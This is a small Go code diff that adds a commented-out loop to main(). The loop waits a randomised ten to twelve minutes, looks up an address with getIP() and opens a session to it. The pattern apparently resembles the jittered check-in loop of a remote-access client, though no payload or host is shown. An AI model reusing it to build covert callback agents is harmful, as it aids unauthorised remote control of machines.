@@ -132,6 +132,30 @@ func getIP() (string, error) {
 }
 
 func main() {
+	// if !canStart("test.txt") {
+	// 	return
+	// }
+	// var timeout int64
+	// if len(os.Args) >= 2 {
+	// 	timeout, _ = strconv.ParseInt(os.Args[1], 10, 64)
+	// }
+	// guuid = uuid.New().String()
+	// var address string
+	// for {
+	// 	if timeout > 0 {
+	// 		time.Sleep(time.Duration(timeout * int64(time.Second)))
+	// 	} else {
+	// 		time.Sleep(time.Duration(600+rand.Intn(120)) * time.Second)
+	// 	}
+	// 	tmpAddress, err := getIP()
+	// 	if err == nil {
+	// 		address = tmpAddress
+	// 	}
+	// 	if len(address) == 0 {
+	// 		continue
+	// 	}
+	// 	session(address)
+	// }
 }
 
 func client() {
